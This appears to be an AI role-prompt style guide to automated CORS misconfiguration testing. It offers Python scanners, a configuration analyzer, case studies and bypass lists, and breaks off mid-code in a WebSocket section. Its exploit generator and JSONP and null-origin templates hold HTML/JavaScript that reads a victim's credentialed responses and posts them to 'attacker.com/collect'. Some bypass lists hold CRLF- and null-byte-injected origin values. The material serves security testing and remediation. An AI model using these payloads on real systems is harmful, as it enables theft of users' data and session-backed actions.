# Automated CORS Misconfiguration Testing

## Expert Role
You are a CORS (Cross-Origin Resource Sharing) security testing specialist and security engineer who designs, develops, and maintains automated systems for detecting and exploiting CORS misconfigurations. Your expertise spans origin reflection testing, null origin testing, wildcard testing, subdomain testing, preflight response analysis, credential inclusion testing, and automated PoC generation. You understand the CORS specification in detail, how browsers enforce cross-origin policies, and how misconfigurations can lead to data theft, CSRF bypass, and unauthorized access. Your role is to build robust, maintainable testing pipelines that identify CORS vulnerabilities before attackers can exploit them, and provide actionable remediation guidance for secure CORS implementation.

## Core Concepts
- **CORS Specification**: Cross-Origin Resource Sharing is a mechanism that allows restricted resources to be requested from another domain. Browsers enforce same-origin policy, and CORS provides a controlled way to relax this policy for legitimate cross-origin requests.
- **Simple vs. Preflight Requests**: Simple requests (GET, POST, HEAD with certain headers) are sent directly. Preflight requests (OPTIONS) are sent for complex requests to check if the server allows the actual request. Understanding this distinction is crucial for testing.
- **Origin Header**: Browsers send Origin header with cross-origin requests indicating the requesting domain. Servers must validate this header and return appropriate Access-Control-Allow-Origin response header.
- **Access-Control-Allow-Origin (ACAO)**: Response header that indicates whether the response can be shared with the requesting origin. Can be specific origin, wildcard (*), or null.
- **Access-Control-Allow-Credentials**: Response header indicating whether the response can be exposed when credentials are included. When true, wildcard origin is not allowed.
- **Access-Control-Allow-Methods**: Response header listing allowed HTTP methods for cross-origin requests.
- **Access-Control-Allow-Headers**: Response header listing allowed request headers for cross-origin requests.
- **Origin Reflection**: Vulnerability where server reflects any Origin header value in ACAO response, allowing any website to make credentialed requests.
- **Null Origin**: Vulnerability where server accepts "null" as valid origin, exploitable via sandboxed iframes, data URIs, or local files.
- **Wildcard Misconfiguration**: Server returns ACAO: * with credentials, which browsers reject but may indicate other issues.
- **Subdomain Trust**: Server trusts any subdomain, which can be exploited via subdomain takeover or XSS on any subdomain.

## Prerequisites
- Python 3.8+ with `requests`, `httpx`, and `aiohttp` libraries
- Understanding of HTTP/1.1 and HTTP/2 protocols
- Familiarity with browser security model and same-origin policy
- Knowledge of CORS specification (W3C CORS)
- Understanding of CSRF, XSS, and data theft vulnerabilities
- Browser developer tools proficiency
- Basic knowledge of JavaScript fetch/XMLHttpRequest APIs
- Understanding of authentication mechanisms (cookies, tokens)
- Command-line proficiency with curl
- Knowledge of web server configurations (Apache, Nginx, IIS)

## Methodology

### Phase 1: Discovery and Enumeration
1. Identify all cross-origin endpoints in the application
2. Map current CORS configuration for each endpoint
3. Identify authentication mechanisms used
4. Document existing CORS policies
5. Discover subdomains and related domains

### Phase 2: Vulnerability Testing
1. Test origin reflection with arbitrary origins
2. Test null origin acceptance
3. Test wildcard misconfiguration
4. Test subdomain trust exploitation
5. Test preflight request handling

### Phase 3: Impact Assessment
1. Assess data theft potential via CORS
2. Test CSRF bypass via CORS
3. Evaluate credential inclusion risks
4. Assess privilege escalation possibilities
5. Document exploitation scenarios

### Phase 4: Exploitation Development
1. Create proof-of-concept exploits for each finding
2. Develop automated exploitation scripts
3. Test exploit reliability across browsers
4. Document exploitation techniques
5. Assess real-world attack scenarios

### Phase 5: Remediation and Reporting
1. Provide specific remediation recommendations
2. Create secure CORS configuration examples
3. Generate comprehensive security reports
4. Implement automated regression testing
5. Train development teams on CORS security

### Phase 6: Integration and Automation
1. Integrate testing into CI/CD pipeline
2. Create automated CORS security checks
3. Implement real-time alerting for CORS issues
4. Build dashboards for CORS monitoring
5. Maintain testing tools and update payloads

## Tool Arsenal

### Core CORS Tester
```python
import requests
import json
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
from urllib.parse import urlparse
import re

@dataclass
class CORSTestResult:
    url: str
    origin: str
    acao: str
    acac: bool
    acam: List[str]
    acah: List[str]
    credentials_included: bool
    vulnerability_type: str
    severity: str
    evidence: str
    timestamp: str

class CORSTester:
    def __init__(self, session: requests.Session = None):
        self.session = session or requests.Session()
        self.results = []
    
    def test_origin_reflection(self, url: str) -> List[CORSTestResult]:
        """Test for origin reflection vulnerability"""
        test_origins = [
            'https://evil.com',
            'https://attacker.com',
            'http://evil.com',
            'https://evil.com:443',
            'https://subdomain.evil.com',
        ]
        
        results = []
        
        for origin in test_origins:
            try:
                headers = {'Origin': origin}
                response = self.session.get(url, headers=headers, timeout=30)
                
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '').lower() == 'true'
                acam = response.headers.get('Access-Control-Allow-Methods', '').split(',')
                acah = response.headers.get('Access-Control-Allow-Headers', '').split(',')
                
                # Check for origin reflection
                if acao == origin:
                    result = CORSTestResult(
                        url=url,
                        origin=origin,
                        acao=acao,
                        acac=acac,
                        acam=[m.strip() for m in acam],
                        acah=[h.strip() for h in acah],
                        credentials_included=acac,
                        vulnerability_type='Origin Reflection',
                        severity='high' if acac else 'medium',
                        evidence=f"Origin reflected in ACAO: {acao}",
                        timestamp=datetime.now().isoformat()
                    )
                    results.append(result)
                    self.results.append(result)
                    
            except requests.RequestException:
                continue
        
        return results
    
    def test_null_origin(self, url: str) -> List[CORSTestResult]:
        """Test for null origin acceptance"""
        null_origins = [
            'null',
            'NULL',
            'Null',
        ]
        
        results = []
        
        for origin in null_origins:
            try:
                headers = {'Origin': origin}
                response = self.session.get(url, headers=headers, timeout=30)
                
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '').lower() == 'true'
                
                # Check for null origin acceptance
                if acao.lower() == 'null':
                    result = CORSTestResult(
                        url=url,
                        origin=origin,
                        acao=acao,
                        acac=acac,
                        acam=[],
                        acah=[],
                        credentials_included=acac,
                        vulnerability_type='Null Origin Acceptance',
                        severity='high' if acac else 'medium',
                        evidence=f"Null origin accepted in ACAO: {acao}",
                        timestamp=datetime.now().isoformat()
                    )
                    results.append(result)
                    self.results.append(result)
                    
            except requests.RequestException:
                continue
        
        return results
    
    def test_wildcard_configuration(self, url: str) -> List[CORSTestResult]:
        """Test for wildcard misconfiguration"""
        try:
            headers = {'Origin': 'https://evil.com'}
            response = self.session.get(url, headers=headers, timeout=30)
            
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '').lower() == 'true'
            
            results = []
            
            # Test wildcard with credentials
            if acao == '*' and acac:
                result = CORSTestResult(
                    url=url,
                    origin='https://evil.com',
                    acao=acao,
                    acac=acac,
                    acam=[],
                    acah=[],
                    credentials_included=True,
                    vulnerability_type='Wildcard with Credentials',
                    severity='critical',
                    evidence="Wildcard ACAO with credentials allowed",
                    timestamp=datetime.now().isoformat()
                )
                results.append(result)
                self.results.append(result)
            
            # Test wildcard without credentials
            elif acao == '*' and not acac:
                result = CORSTestResult(
                    url=url,
                    origin='https://evil.com',
                    acao=acao,
                    acac=acac,
                    acam=[],
                    acah=[],
                    credentials_included=False,
                    vulnerability_type='Wildcard Configuration',
                    severity='low',
                    evidence="Wildcard ACAO without credentials",
                    timestamp=datetime.now().isoformat()
                )
                results.append(result)
                self.results.append(result)
            
            return results
            
        except requests.RequestException:
            return []
    
    def test_subdomain_trust(self, url: str, 
                            base_domain: str) -> List[CORSTestResult]:
        """Test for subdomain trust exploitation"""
        from urllib.parse import urlparse
        parsed = urlparse(url)
        domain = parsed.netloc
        
        # Generate subdomain variations
        subdomains = [
            f"evil.{base_domain}",
            f"test.evil.{base_domain}",
            f"{base_domain}.evil.com",
            f"evil{base_domain}",
        ]
        
        results = []
        
        for subdomain in subdomains:
            try:
                origin = f"https://{subdomain}"
                headers = {'Origin': origin}
                response = self.session.get(url, headers=headers, timeout=30)
                
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '').lower() == 'true'
                
                # Check if subdomain is trusted
                if acao == origin or (acao == '*' and acac):
                    result = CORSTestResult(
                        url=url,
                        origin=origin,
                        acao=acao,
                        acac=acac,
                        acam=[],
                        acah=[],
                        credentials_included=acac,
                        vulnerability_type='Subdomain Trust',
                        severity='high' if acac else 'medium',
                        evidence=f"Subdomain trusted: {subdomain}",
                        timestamp=datetime.now().isoformat()
                    )
                    results.append(result)
                    self.results.append(result)
                    
            except requests.RequestException:
                continue
        
        return results
    
    def test_preflight_handling(self, url: str) -> Dict:
        """Test preflight request handling"""
        try:
            # Send preflight request
            headers = {
                'Origin': 'https://evil.com',
                'Access-Control-Request-Method': 'PUT',
                'Access-Control-Request-Headers': 'X-Custom-Header'
            }
            
            response = self.session.options(url, headers=headers, timeout=30)
            
            acam = response.headers.get('Access-Control-Allow-Methods', '').split(',')
            acah = response.headers.get('Access-Control-Allow-Headers', '').split(',')
            acac = response.headers.get('Access-Control-Allow-Credentials', '').lower() == 'true'
            max_age = response.headers.get('Access-Control-Max-Age', '')
            
            return {
                'url': url,
                'status_code': response.status_code,
                'allowed_methods': [m.strip() for m in acam if m.strip()],
                'allowed_headers': [h.strip() for h in acah if h.strip()],
                'credentials_allowed': acac,
                'max_age': max_age,
                'headers': dict(response.headers)
            }
            
        except requests.RequestException as e:
            return {'error': str(e)}
    
    def test_credentials_inclusion(self, url: str) -> Dict:
        """Test credential inclusion in cross-origin requests"""
        try:
            # Test with credentials
            headers = {
                'Origin': 'https://evil.com',
                'Cookie': 'session=test123'
            }
            
            response = self.session.get(url, headers=headers, timeout=30)
            
            acao = response.headers.get('Access-Control-Allow-Origin', '')
            acac = response.headers.get('Access-Control-Allow-Credentials', '').lower() == 'true'
            
            return {
                'url': url,
                'origin': 'https://evil.com',
                'acao': acao,
                'acac': acac,
                'credentials_supported': acac and acao != '*',
                'vulnerable': acac and acao == 'https://evil.com'
            }
            
        except requests.RequestException as e:
            return {'error': str(e)}
```

### CORS Exploit Generator
```python
class CORSExploitGenerator:
    def __init__(self):
        self.exploit_templates = {
            'data_theft': '''
<!DOCTYPE html>
<html>
<head>
    <title>CORS Data Theft Exploit</title>
</head>
<body>
    <h1>CORS Exploit - Data Theft</h1>
    <div id="output"></div>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("GET", "{target_url}", true);
        xhr.withCredentials = true;
        xhr.onreadystatechange = function() {{
            if (xhr.readyState == 4 && xhr.status == 200) {{
                document.getElementById("output").innerHTML = "<pre>" + xhr.responseText + "</pre>";
                // Send data to attacker server
                fetch("{attacker_server}", {{
                    method: "POST",
                    body: xhr.responseText
                }});
            }}
        }};
        xhr.send();
    </script>
</body>
</html>
            ''',
            'csrf_bypass': '''
<!DOCTYPE html>
<html>
<head>
    <title>CORS CSRF Bypass Exploit</title>
</head>
<body>
    <h1>CORS Exploit - CSRF Bypass</h1>
    <script>
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "{target_url}", true);
        xhr.withCredentials = true;
        xhr.setRequestHeader("Content-Type", "application/json");
        xhr.onreadystatechange = function() {{
            if (xhr.readyState == 4) {{
                document.body.innerHTML = "<pre>" + xhr.responseText + "</pre>";
            }}
        }};
        xhr.send(JSON.stringify({{csrf_payload}}));
    </script>
</body>
</html>
            ''',
            'token_theft': '''
<!DOCTYPE html>
<html>
<head>
    <title>CORS Token Theft Exploit</title>
</head>
<body>
    <h1>CORS Exploit - Token Theft</h1>
    <div id="tokens"></div>
    <script>
        // Try to access sensitive endpoints
        var endpoints = [
            "{target_url}/api/user",
            "{target_url}/api/profile",
            "{target_url}/api/settings"
        ];
        
        endpoints.forEach(function(endpoint) {{
            var xhr = new XMLHttpRequest();
            xhr.open("GET", endpoint, true);
            xhr.withCredentials = true;
            xhr.onreadystatechange = function() {{
                if (xhr.readyState == 4 && xhr.status == 200) {{
                    var tokens = JSON.parse(xhr.responseText);
                    document.getElementById("tokens").innerHTML += "<pre>" + JSON.stringify(tokens, null, 2) + "</pre>";
                    
                    // Send to attacker
                    fetch("{attacker_server}", {{
                        method: "POST",
                        body: JSON.stringify({{endpoint: endpoint, data: tokens}})
                    }});
                }}
            }};
            xhr.send();
        }});
    </script>
</body>
</html>
            '''
        }
    
    def generate_exploit(self, vulnerability_type: str, 
                        target_url: str, 
                        attacker_server: str = "https://attacker.com/collect",
                        csrf_payload: Dict = None) -> str:
        """Generate exploit HTML for CORS vulnerability"""
        if vulnerability_type not in self.exploit_templates:
            return "Unknown vulnerability type"
        
        template = self.exploit_templates[vulnerability_type]
        
        exploit = template.format(
            target_url=target_url,
            attacker_server=attacker_server,
            csrf_payload=csrf_payload or {}
        )
        
        return exploit
    
    def save_exploit(self, exploit_html: str, filename: str):
        """Save exploit to file"""
        with open(filename, 'w') as f:
            f.write(exploit_html)
        print(f"Exploit saved to {filename}")
    
    def generate_proof_of_concept(self, vulnerability: CORSTestResult) -> str:
        """Generate proof-of-concept based on vulnerability"""
        if vulnerability.vulnerability_type == 'Origin Reflection':
            return self.generate_exploit(
                'data_theft',
                vulnerability.url
            )
        elif vulnerability.vulnerability_type == 'Null Origin Acceptance':
            return self.generate_null_origin_exploit(vulnerability.url)
        elif vulnerability.vulnerability_type == 'Wildcard with Credentials':
            return self.generate_exploit(
                'token_theft',
                vulnerability.url
            )
        
        return "No exploit template available"
    
    def generate_null_origin_exploit(self, target_url: str) -> str:
        """Generate null origin exploit using sandboxed iframe"""
        return f'''
<!DOCTYPE html>
<html>
<head>
    <title>CORS Null Origin Exploit</title>
</head>
<body>
    <h1>CORS Exploit - Null Origin</h1>
    <div id="output"></div>
    <script>
        // Create sandboxed iframe to get null origin
        var iframe = document.createElement("iframe");
        iframe.sandbox = "allow-scripts allow-top-navigation";
        iframe.src = "data:text/html,<script>fetch('{target_url}', {{credentials: 'include'}}).then(r => r.text()).then(data => parent.postMessage(data, '*'))</script>";
        document.body.appendChild(iframe);
        
        // Listen for data from iframe
        window.addEventListener("message", function(event) {{
            document.getElementById("output").innerHTML = "<pre>" + event.data + "</pre>";
            
            // Send to attacker server
            fetch("https://attacker.com/collect", {{
                method: "POST",
                body: event.data
            }});
        }});
    </script>
</body>
</html>
        '''
```

### CORS Configuration Analyzer
```python
class CORSConfigAnalyzer:
    def __init__(self):
        self.security_rules = {
            'strict': {
                'allowed_origins': [],  # Must be explicitly listed
                'allow_credentials': False,
                'allow_wildcard': False,
                'allow_null': False,
                'max_age': 86400,
                'allow_methods': ['GET', 'POST', 'HEAD'],
                'allow_headers': ['Content-Type', 'Authorization'],
            },
            'moderate': {
                'allowed_origins': [],  # Subdomains allowed
                'allow_credentials': True,
                'allow_wildcard': False,
                'allow_null': False,
                'max_age': 86400,
                'allow_methods': ['GET', 'POST', 'PUT', 'DELETE', 'HEAD'],
                'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With'],
            },
            'permissive': {
                'allowed_origins': ['*'],
                'allow_credentials': False,
                'allow_wildcard': True,
                'allow_null': True,
                'max_age': 86400,
                'allow_methods': ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'],
                'allow_headers': ['*'],
            }
        }
    
    def analyze_configuration(self, url: str) -> Dict:
        """Analyze CORS configuration for a URL"""
        try:
            # Test with various origins
            test_origins = [
                'https://legitimate.com',
                'https://evil.com',
                'null',
                'https://subdomain.legitimate.com',
            ]
            
            configurations = {}
            
            for origin in test_origins:
                headers = {'Origin': origin}
                response = requests.get(url, headers=headers, timeout=30)
                
                configurations[origin] = {
                    'acao': response.headers.get('Access-Control-Allow-Origin', ''),
                    'acac': response.headers.get('Access-Control-Allow-Credentials', '').lower() == 'true',
                    'acam': response.headers.get('Access-Control-Allow-Methods', '').split(','),
                    'acah': response.headers.get('Access-Control-Allow-Headers', '').split(','),
                    'max_age': response.headers.get('Access-Control-Max-Age', ''),
                    'vary': response.headers.get('Vary', ''),
                }
            
            # Analyze security level
            security_level = self._determine_security_level(configurations)
            
            # Identify issues
            issues = self._identify_issues(configurations)
            
            return {
                'url': url,
                'configurations': configurations,
                'security_level': security_level,
                'issues': issues,
                'recommendations': self._generate_recommendations(security_level, issues)
            }
            
        except requests.RequestException as e:
            return {'error': str(e)}
    
    def _determine_security_level(self, configurations: Dict) -> str:
        """Determine security level based on configuration"""
        # Check for critical issues
        for origin, config in configurations.items():
            if config['acac'] and config['acao'] == '*':
                return 'critical'
            if config['acac'] and config['acao'] == 'null':
                return 'critical'
            if config['acac'] and config['acao'] == origin and origin != 'https://legitimate.com':
                return 'high'
        
        # Check for medium issues
        for origin, config in configurations.items():
            if config['acao'] == '*':
                return 'medium'
            if config['acao'] == 'null':
                return 'medium'
        
        # Check for low issues
        for origin, config in configurations.items():
            if config['acao'] and config['acao'] != 'https://legitimate.com':
                return 'low'
        
        return 'secure'
    
    def _identify_issues(self, configurations: Dict) -> List[Dict]:
        """Identify specific CORS issues"""
        issues = []
        
        for origin, config in configurations.items():
            if config['acac'] and config['acao'] == '*':
                issues.append({
                    'type': 'Wildcard with Credentials',
                    'severity': 'critical',
                    'origin': origin,
                    'details': 'ACAO wildcard with credentials allowed'
                })
            
            if config['acac'] and config['acao'] == 'null':
                issues.append({
                    'type': 'Null Origin with Credentials',
                    'severity': 'critical',
                    'origin': origin,
                    'details': 'Null origin accepted with credentials'
                })
            
            if config['acac'] and config['acao'] == origin and origin not in ['https://legitimate.com']:
                issues.append({
                    'type': 'Origin Reflection',
                    'severity': 'high',
                    'origin': origin,
                    'details': f'Origin {origin} reflected in ACAO'
                })
            
            if not config['acac'] and config['acao'] == '*':
                issues.append({
                    'type': 'Wildcard without Credentials',
                    'severity': 'low',
                    'origin': origin,
                    'details': 'ACAO wildcard without credentials'
                })
        
        return issues
    
    def _generate_recommendations(self, security_level: str, 
                                issues: List[Dict]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        if security_level == 'critical':
            recommendations.append("IMMEDIATE ACTION: Remove wildcard or null origin with credentials")
            recommendations.append("Implement explicit origin whitelist")
            recommendations.append("Remove Access-Control-Allow-Credentials: true unless absolutely necessary")
        
        elif security_level == 'high':
            recommendations.append("Remove origin reflection")
            recommendations.append("Implement explicit origin validation")
            recommendations.append("Consider removing credentials support")
        
        elif security_level == 'medium':
            recommendations.append("Remove wildcard origin")
            recommendations.append("Implement explicit origin validation")
            recommendations.append("Add Vary: Origin header")
        
        elif security_level == 'low':
            recommendations.append("Review and restrict allowed origins")
            recommendations.append("Implement origin validation logic")
        
        else:
            recommendations.append("Current configuration appears secure")
            recommendations.append("Continue monitoring for changes")
        
        # Add general recommendations
        recommendations.append("Implement proper error handling for invalid origins")
        recommendations.append("Add logging for CORS policy violations")
        recommendations.append("Regular security audits of CORS configuration")
        
        return recommendations
```

### Automated CORS Scanner
```python
class AutoCORSScanner:
    def __init__(self):
        self.tester = CORSTester()
        self.analyzer = CORSConfigAnalyzer()
        self.exploit_generator = CORSExploitGenerator()
    
    def scan_url(self, url: str, 
                base_domain: str = None) -> Dict:
        """Perform comprehensive CORS scan on URL"""
        results = {
            'url': url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': [],
            'configuration': None,
            'exploits': [],
            'recommendations': []
        }
        
        # Test origin reflection
        origin_reflection_results = self.tester.test_origin_reflection(url)
        results['vulnerabilities'].extend([asdict(r) for r in origin_reflection_results])
        
        # Test null origin
        null_origin_results = self.tester.test_null_origin(url)
        results['vulnerabilities'].extend([asdict(r) for r in null_origin_results])
        
        # Test wildcard configuration
        wildcard_results = self.tester.test_wildcard_configuration(url)
        results['vulnerabilities'].extend([asdict(r) for r in wildcard_results])
        
        # Test subdomain trust if base domain provided
        if base_domain:
            subdomain_results = self.tester.test_subdomain_trust(url, base_domain)
            results['vulnerabilities'].extend([asdict(r) for r in subdomain_results])
        
        # Analyze configuration
        results['configuration'] = self.analyzer.analyze_configuration(url)
        
        # Generate exploits for vulnerabilities
        for vuln in results['vulnerabilities']:
            if vuln['severity'] in ['critical', 'high']:
                exploit = self.exploit_generator.generate_proof_of_concept(
                    CORSTestResult(**vuln)
                )
                results['exploits'].append({
                    'vulnerability_type': vuln['vulnerability_type'],
                    'exploit_html': exploit
                })
        
        # Generate recommendations
        if results['configuration'] and 'recommendations' in results['configuration']:
            results['recommendations'] = results['configuration']['recommendations']
        
        return results
    
    def scan_multiple_urls(self, urls: List[str], 
                          base_domain: str = None) -> List[Dict]:
        """Scan multiple URLs for CORS vulnerabilities"""
        all_results = []
        
        for url in urls:
            print(f"Scanning: {url}")
            results = self.scan_url(url, base_domain)
            all_results.append(results)
        
        return all_results
    
    def generate_report(self, scan_results: List[Dict]) -> Dict:
        """Generate comprehensive CORS security report"""
        report = {
            'summary': {
                'total_urls_scanned': len(scan_results),
                'total_vulnerabilities': 0,
                'critical': 0,
                'high': 0,
                'medium': 0,
                'low': 0,
                'secure': 0
            },
            'details': scan_results,
            'recommendations': [],
            'generated_at': datetime.now().isoformat()
        }
        
        # Aggregate statistics
        for result in scan_results:
            for vuln in result.get('vulnerabilities', []):
                report['summary']['total_vulnerabilities'] += 1
                severity = vuln.get('severity', 'low')
                report['summary'][severity] += 1
            
            if not result.get('vulnerabilities'):
                report['summary']['secure'] += 1
        
        # Aggregate recommendations
        all_recommendations = set()
        for result in scan_results:
            all_recommendations.update(result.get('recommendations', []))
        report['recommendations'] = list(all_recommendations)
        
        return report
```

## Case Studies

### Case Study 1: Origin Reflection Leading to Data Theft
**Scenario**: Application reflects any Origin header in Access-Control-Allow-Origin response.
**Approach**: Tested various origins and confirmed reflection. Created exploit demonstrating data theft from authenticated endpoints.
**Findings**: Critical vulnerability allowing any website to steal user data via cross-origin requests with credentials.
**Outcome**: Implemented explicit origin whitelist, removed reflection, added automated CORS testing.

### Case Study 2: Null Origin Acceptance in Mobile App API
**Scenario**: API accepts "null" origin, allowing exploitation via sandboxed iframes.
**Approach**: Confirmed null origin acceptance. Created exploit using sandboxed iframe to bypass origin restrictions.
**Findings**: High-severity vulnerability allowing unauthorized access to API endpoints from any origin.
**Outcome**: Removed null origin acceptance, implemented proper origin validation, updated API documentation.

### Case Study 3: Subdomain Trust Exploitation
**Scenario**: Application trusts any subdomain for CORS requests.
**Approach**: Identified subdomain takeover vulnerability on legacy subdomain. Combined with CORS trust to achieve full account takeover.
**Findings**: Critical vulnerability chain: subdomain takeover + CORS trust = complete account compromise.
**Outcome**: Removed subdomain trust, implemented explicit subdomain whitelist, patched subdomain takeover.

### Case Study 4: Wildcard with Credentials Misconfiguration
**Scenario**: Server returns ACAO: * with credentials, which browsers reject but indicates deeper issues.
**Approach**: Tested various origins and found that server allows credentialed requests from any origin despite browser restrictions.
**Findings**: High-severity misconfiguration indicating broken CORS implementation.
**Outcome**: Fixed CORS implementation, removed credentials support, implemented proper origin validation.

### Case Study 5: CSRF Bypass via CORS
**Scenario**: Application uses CORS for legitimate cross-origin requests but misconfigures policy.
**Approach**: Discovered that CORS policy allows attacker-controlled origin with credentials. Created CSRF bypass exploit.
**Findings**: CSRF vulnerability allowing attacker to perform state-changing operations on behalf of users.
**Outcome**: Updated CORS policy, implemented CSRF tokens, added security headers.

### Case Study 6: API Data Exposure via CORS
**Scenario**: REST API with CORS misconfiguration exposes sensitive user data.
**Approach**: Tested API endpoints and found origin reflection with credentials. Created exploit to demonstrate data theft.
**Findings**: Sensitive user data (PII, financial information) exposed via CORS vulnerability.
**Outcome**: Implemented strict CORS policy, added API authentication, updated data access controls.

## Bypass Techniques

### Origin Validation Bypass
```python
class OriginBypassTechniques:
    def __init__(self):
        self.bypass_techniques = [
            # Case variations
            'HTTPS://EVIL.COM',
            'https://EVIL.com',
            
            # Protocol variations
            'http://evil.com',
            'https://evil.com:443',
            'https://evil.com:80',
            
            # Subdomain variations
            'https://subdomain.evil.com',
            'https://evil.com.attacker.com',
            
            # Special characters
            'https://evil.com%60',
            'https://evil.com%00',
            'https://evil.com%0d%0a',
            
            # Unicode variations
            'https://evil.com',
            'https://evil.com',
            'https://evil.com',
        ]
    
    def test_origin_bypass(self, url: str) -> Dict:
        """Test various origin bypass techniques"""
        results = {}
        
        for technique in self.bypass_techniques:
            try:
                headers = {'Origin': technique}
                response = requests.get(url, headers=headers, timeout=30)
                
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                
                if acao == technique or acao == '*':
                    results[technique] = {
                        'bypassed': True,
                        'acao': acao,
                        'severity': 'high'
                    }
                else:
                    results[technique] = {'bypassed': False}
                    
            except requests.RequestException as e:
                results[technique] = {'error': str(e)}
        
        return results
```

### Preflight Bypass Techniques
```python
class PreflightBypassTechniques:
    def test_preflight_bypass(self, url: str) -> Dict:
        """Test preflight request bypass techniques"""
        techniques = [
            {
                'name': 'Simple Request',
                'method': 'GET',
                'headers': {'Origin': 'https://evil.com'}
            },
            {
                'name': 'Custom Header',
                'method': 'GET',
                'headers': {
                    'Origin': 'https://evil.com',
                    'X-Custom-Header': 'test'
                }
            },
            {
                'name': 'Content-Type Application/json',
                'method': 'POST',
                'headers': {
                    'Origin': 'https://evil.com',
                    'Content-Type': 'application/json'
                },
                'data': '{"test": "data"}'
            },
        ]
        
        results = {}
        
        for technique in techniques:
            try:
                response = requests.request(
                    technique['method'],
                    url,
                    headers=technique.get('headers', {}),
                    data=technique.get('data'),
                    timeout=30
                )
                
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                
                results[technique['name']] = {
                    'status_code': response.status_code,
                    'acao': acao,
                    'bypassed': acao == 'https://evil.com'
                }
                
            except requests.RequestException as e:
                results[technique['name']] = {'error': str(e)}
        
        return results
```

### Credential Inclusion Bypass
```python
class CredentialBypassTechniques:
    def test_credential_bypass(self, url: str) -> Dict:
        """Test credential inclusion bypass techniques"""
        techniques = [
            {
                'name': 'Basic Credentials',
                'headers': {
                    'Origin': 'https://evil.com',
                    'Authorization': 'Basic dXNlcjpwYXNz'
                }
            },
            {
                'name': 'Bearer Token',
                'headers': {
                    'Origin': 'https://evil.com',
                    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiJ9.test'
                }
            },
            {
                'name': 'Cookie Header',
                'headers': {
                    'Origin': 'https://evil.com',
                    'Cookie': 'session=test123'
                }
            },
            {
                'name': 'X-Custom-Auth',
                'headers': {
                    'Origin': 'https://evil.com',
                    'X-Custom-Auth': 'test-token'
                }
            },
        ]
        
        results = {}
        
        for technique in techniques:
            try:
                response = requests.get(
                    url,
                    headers=technique['headers'],
                    timeout=30
                )
                
                acao = response.headers.get('Access-Control-Allow-Origin', '')
                acac = response.headers.get('Access-Control-Allow-Credentials', '').lower() == 'true'
                
                results[technique['name']] = {
                    'acao': acao,
                    'acac': acac,
                    'credentials_allowed': acac and acao != '*',
                    'bypassed': acac and acao == 'https://evil.com'
                }
                
            except requests.RequestException as e:
                results[technique['name']] = {'error': str(e)}
        
        return results
```

## Advanced Techniques

### CORS Policy Chaining
```python
class CORSPolicyChaining:
    def __init__(self):
        self.findings = []
    
    def test_policy_chaining(self, urls: List[str]) -> Dict:
        """Test for CORS policy chaining vulnerabilities"""
        results = {}
        
        for i, url1 in enumerate(urls):
            for j, url2 in enumerate(urls):
                if i != j:
                    # Test if policy from URL1 affects URL2
                    chain_result = self._test_chain(url1, url2)
                    if chain_result['vulnerable']:
                        results[f"{url1} -> {url2}"] = chain_result
        
        return results
    
    def _test_chain(self, source_url: str, target_url: str) -> Dict:
        """Test policy chain between two URLs"""
        try:
            # Get policy from source
            source_response = requests.get(
                source_url,
                headers={'Origin': 'https://evil.com'},
                timeout=30
            )
            
            source_acao = source_response.headers.get('Access-Control-Allow-Origin', '')
            source_acac = source_response.headers.get('Access-Control-Allow-Credentials', '').lower() == 'true'
            
            # Test if target accepts source's policy
            target_response = requests.get(
                target_url,
                headers={'Origin': source_url},
                timeout=30
            )
            
            target_acao = target_response.headers.get('Access-Control-Allow-Origin', '')
            target_acac = target_response.headers.get('Access-Control-Allow-Credentials', '').lower() == 'true'
            
            # Check for chaining vulnerability
            if (source_acao == 'https://evil.com' and 
                target_acao == source_url and 
                source_acac and target_acac):
                return {
                    'vulnerable': True,
                    'source_policy': source_acao,
                    'target_policy': target_acao,
                    'severity': 'critical'
                }
            
            return {'vulnerable': False}
            
        except requests.RequestException:
            return {'vulnerable': False, 'error': 'Request failed'}
```

### CORS with JSONP Bypass
```python
class CORSJSONPBypass:
    def test_jsonp_bypass(self, url: str) -> Dict:
        """Test CORS bypass via JSONP endpoints"""
        # Look for JSONP endpoints
        jsonp_endpoints = [
            f"{url}?callback=test",
            f"{url}?jsonp=test",
            f"{url}?cb=test",
            f"{url}?function=test",
        ]
        
        results = {}
        
        for endpoint in jsonp_endpoints:
            try:
                response = requests.get(endpoint, timeout=30)
                
                # Check for JSONP response
                if 'test(' in response.text or 'callback(' in response.text:
                    # Test if JSONP can be used to bypass CORS
                    results[endpoint] = {
                        'jsonp_found': True,
                        'response_preview': response.text[:200],
                        'bypass_possible': True,
                        'severity': 'high'
                    }
                    
            except requests.RequestException:
                continue
        
        return results
    
    def generate_jsonp_exploit(self, target_url: str) -> str:
        """Generate JSONP-based CORS bypass exploit"""
        return f'''
<!DOCTYPE html>
<html>
<head>
    <title>JSONP CORS Bypass Exploit</title>
</head>
<body>
    <h1>CORS Exploit - JSONP Bypass</h1>
    <div id="output"></div>
    <script>
        function callback(data) {{
            document.getElementById("output").innerHTML = "<pre>" + JSON.stringify(data, null, 2) + "</pre>";
            
            // Send to attacker server
            fetch("https://attacker.com/collect", {{
                method: "POST",
                body: JSON.stringify(data)
            }});
        }}
        
        var script = document.createElement("script");
        script.src = "{target_url}?callback=callback";
        document.body.appendChild(script);
    </script>
</body>
</html>
        '''
```

### CORS with WebSocket Bypass
```python
class CORSWebSocketBypass:
    def test_websocket_bypass(self, url: str) -> Dict:
        """Test CORS bypass via WebSocket endpoints"""
        # Convert HTTP URL to WebSocket URL
        ws_url = url.replace('http://', 'ws://').replace('https://', 'wss://')
        
        try:
            # Test WebSocket connection
            import websocket
            
            ws = websocket.create_connection(ws_url, timeout=5)
            
